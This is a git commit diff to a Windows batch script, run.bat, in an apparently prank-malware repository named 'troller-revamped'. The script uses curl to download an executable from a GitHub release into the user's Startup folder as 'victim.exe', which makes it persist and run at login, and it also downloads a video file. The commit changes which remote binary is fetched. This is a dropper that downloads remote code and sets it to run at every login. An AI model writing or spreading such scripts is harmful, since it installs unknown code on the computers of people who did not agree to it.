595f3d8a9ec5df80cb729c7e664337aece0d782b
vexnity <159264249+vexnity@users.noreply.github.com>
2024-06-30 14:49:58 +0530

    Update run.bat

--- run.bat
+++ run.bat
@@ -2,7 +2,7 @@
 set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 
 :: download the executable and the video file
-curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troller.exe" -o "%STARTUP_FOLDER%\victim.exe"
+curl -L "https://github.com/vexnity/troller-revamped/releases/download/Realest/Python.Script.exe" -o "%STARTUP_FOLDER%\victim.exe"
 curl "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/test.mp4" -o "%STARTUP_FOLDER%\test.mp4"
 
 :: check if the files are downloaded
